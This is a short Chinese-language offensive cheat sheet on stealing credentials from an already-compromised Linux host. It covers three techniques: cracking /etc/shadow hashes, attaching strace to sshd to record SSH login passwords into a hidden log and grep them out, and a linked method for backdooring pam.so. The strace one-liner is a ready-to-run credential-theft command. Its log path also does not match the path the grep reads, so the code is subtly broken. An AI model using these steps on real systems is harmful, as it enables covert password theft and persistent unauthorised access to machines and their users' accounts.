# Linux 认证凭证获取

## 0x00 概述

目标是在 Linux 主机上获取可用于后续横向或提权的认证材料，包括：

- `/etc/shadow` 中的口令散列
- SSH 登录明文
- PAM 链路可截获的凭证

前提通常是已经拿到本机命令执行权限，且具备一定的文件读取、进程调试或替换能力。

## 0x01 获取明文密码

### 1. /etc/shadow中hash破解
```
root:$1$aXmGMjXX$MGrR.Hquwr7UVMwOGOzJV0::0:99999:7:::

```

密码域密文由三部分组成，即：$idsalt$encrypted。当id=1，采用md5进行加密，弱口令容易被破解。
当id为5时，采用SHA256进行加密，id为6时，采用SHA512进行加密，可以通过john进行暴力破解。

### 2.利用Strace调试sshd进程抓登录密码
strace命令
```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/re/.sshd.log &)
```
通过正则可以查询.sshd.log 密码信息:
```
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log
```
### 3. 替换pam.so抓取登录密码
条件比较苛刻，要适配操作系统和sshd应用版本。

- [Linux PAM后门：窃取ssh密码及自定义密码登录](https://y4er.com/post/linux-backdoor-pam/)

## 0x02 注意事项

- 优先判断是“离线口令散列”还是“在线明文截获”场景，两者前提不同。
- 涉及 `sshd` 调试和 `pam.so` 替换时，稳定性风险明显更高。
- 获得散列后先判断算法类型，再决定是否值得做口令破解。

## Ref

-[Linux下登录凭证窃取技巧](https://zyazhb.github.io/2020/09/28/steal-linux/)
